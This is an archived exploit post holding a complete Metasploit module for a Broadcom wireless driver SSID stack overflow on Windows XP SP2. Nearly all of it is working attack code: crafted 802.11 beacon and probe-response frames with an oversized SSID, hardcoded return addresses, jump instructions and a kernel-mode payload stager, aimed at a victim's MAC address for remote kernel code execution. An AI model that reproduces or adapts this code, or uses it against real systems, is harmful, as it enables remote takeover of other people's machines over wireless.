<html><head><title>Broadcom Wireless Driver Probe Response SSID Overflow Exploit (meta)</title></head><pre>require 'msf/core'

module Msf

class Exploits::Windows::Driver::Broadcom_WiFi_SSID &lt; Msf::Exploit::Remote

	include Exploit::Lorcon
	include Exploit::KernelMode	

	def initialize(info = {})
		super(update_info(info,	
			'Name'           =&gt; 'Broadcom Wireless Driver Probe Response SSID Overflow',
			'Description'    =&gt; %q{
				This module exploits a stack overflow in the Broadcom Wireless driver
			that allows remote code execution in kernel mode by sending a 802.11 probe
			response that contains a long SSID. The target MAC address must
			be provided to use this exploit. The two cards tested fell into the
			00:14:a5:06:XX:XX and 00:14:a4:2a:XX:XX ranges.

			This module depends on the Lorcon library and only works on the Linux platform
			with a supported wireless card. Please see the Ruby Lorcon documentation 
			(external/ruby-lorcon/README) for more information.			
			},
			
			'Authors'        =&gt; 
				[
					'Chris Eagle',	# initial discovery
					'Johnny Cache &lt;johnnycsh [at] 802.11mercenary.com&gt;', # the man with the plan
					'skape', # windows kernel ninjitsu and debugging
					'hdm' # porting the C version to ruby
				],
			'License'        =&gt; MSF_LICENSE,
			'Version'        =&gt; '$Revision: 3583 $',
			'References'     =&gt;
				[
					['URL', 'http://projects.info-pull.com/mokb/MOKB-11-11-2006.html'],
				],
			'Privileged'     =&gt; true,
						
			'DefaultOptions' =&gt;
				{
					'EXITFUNC' =&gt; 'thread',
				},

			'Payload'        =&gt;
				{
					'Space'    =&gt; 500
				},
			'Platform'       =&gt; 'win',
			'Targets'        =&gt; 
				[
					# 5.1.2600.2622 (xpsp_sp2_gdr.050301-1519)
					[ 'Windows XP SP2 (5.1.2600.2122), bcmwl5.sys 3.50.21.10',
						{
							'Ret'      =&gt; 0x8066662c, # jmp edi
							'Platform' =&gt; 'win',
							'Payload'  =&gt; 
							{
								'ExtendedOptions' =&gt; 
								{
									'Stager'       =&gt; 'sud_syscall_hook',
									'PrependUser'  =&gt; &quot;\x81\xC4\x54\xF2\xFF\xFF&quot;, # add esp, -3500
									'Recovery'     =&gt; 'idlethread_restart',
									'KiIdleLoopAddress' =&gt; 0x804dbb27,										
										
								}
							}
						} 
					],
					
					# 5.1.2600.2180 (xpsp_sp2_rtm_040803-2158)
					[ 'Windows XP SP2 (5.1.2600.2180), bcmwl5.sys 3.50.21.10',
						{
							'Ret'      =&gt; 0x804f16eb, # jmp edi
							'Platform' =&gt; 'win',
							'Payload'  =&gt; 
							{
								'ExtendedOptions' =&gt; 
								{
									'Stager'       =&gt; 'sud_syscall_hook',
									'PrependUser'  =&gt; &quot;\x81\xC4\x54\xF2\xFF\xFF&quot;, # add esp, -3500
									'Recovery'     =&gt; 'idlethread_restart',
									'KiIdleLoopAddress' =&gt; 0x804dc0c7,
								}
							}
						} 
					]					
				],

			'DefaultTarget' =&gt; 0
			))
			
		register_options(
			[
				OptString.new('ADDR_DST', [ true,  &quot;The MAC address of the target system&quot;,'FF:FF:FF:FF:FF:FF']),
				OptInt.new('RUNTIME', [ true,  &quot;The number of seconds to run the attack&quot;, 60])
			], self.class)
	end

	def exploit
		open_wifi
		
		stime = Time.now.to_i
		
		print_status(&quot;Sending beacons and responses for #{datastore['RUNTIME']} seconds...&quot;)
		
		while (stime + datastore['RUNTIME'].to_i &gt; Time.now.to_i) 
			
			select(nil, nil, nil, 0.02)
			wifi.write(create_response)

			select(nil, nil, nil, 0.01)
			wifi.write(create_beacon)
			
			break if session_created?
			
		end
		
		print_status(&quot;Finished sending frames...&quot;)
	end
	
	def create_beacon
		src = eton('90:e9:75:00:00:00') #relative jmp + 0x75 = stage2 HaHa. Tuned for ssid len = 93
		dst = eton('FF:FF:FF:FF:FF:FF')
		seq = [Time.now.to_i % 4096].pack('n')
	
		blob = create_frame
		blob[0,1] = 0x80.chr
		blob[4,6] = dst
		blob[10,6] = src
		blob[16,6] = src
		blob[22,2] = seq
		
		blob
	end
	
	def create_response
		src = eton('90:e9:75:00:00:00') #relative jmp + 0x75 = stage2 HaHa. Tuned for ssid len = 93
		dst = eton(datastore['ADDR_DST'])
		seq = [Time.now.to_i % 256].pack('n')
	
		blob = create_frame
		blob[0,1] = 0x50.chr		
		blob[4,6] = dst
		blob[10,6] = src
		blob[16,6] = src # bssid field, good idea to set to src. 
		blob[22,2] = seq
		
		blob
	end

	def create_frame
		&quot;\x80&quot; +                      # type/subtype
		&quot;\x00&quot; +                      # flags
		&quot;\x00\x00&quot; +                  # duration  
		&quot;\xff\xff\xff\xff\xff\xff&quot; +  # dst
		&quot;\x58\x58\x58\x58\x58\x58&quot; +  # src
		&quot;\x58\x58\x58\x58\x58\x58&quot; +  # bssid
		&quot;\x70\xed&quot; +                  # sequence number
		
		#
		# fixed parameters
		#
		
		# timestamp value
		Rex::Text.rand_text_alphanumeric(8) + 
		&quot;\x64\x00&quot; +                  # beacon interval
		&quot;\x11\x04&quot; +                  # capability flags
		
		#
		# tagged parameters
		#
		
		# ssid tag
		&quot;\x00&quot; + # tag: SSID parameter set
		&quot;\x5d&quot; + # len: length is 93 bytes
		
		# jump into the payload
		&quot;\x89\xf9&quot; +                 # mov edi, ecx
		&quot;\x81\xc1\x7b\x00\x00\x00&quot; + # add ecx, 0x7b
		&quot;\xff\xe1&quot; +                 # jmp ecx
		
		# padding
		Rex::Text.rand_text_alphanumeric(79) + 
		
		# return address
		[target.ret].pack('V') +
		
		# vendor specific tag
		&quot;\xdd&quot; + # wpa
		&quot;\xff&quot; + # big as we can make it
		
		# the kernel-mode stager
		payload.encoded
	end
	
end
end

# milw0rm.com [2006-11-13]</pre></html>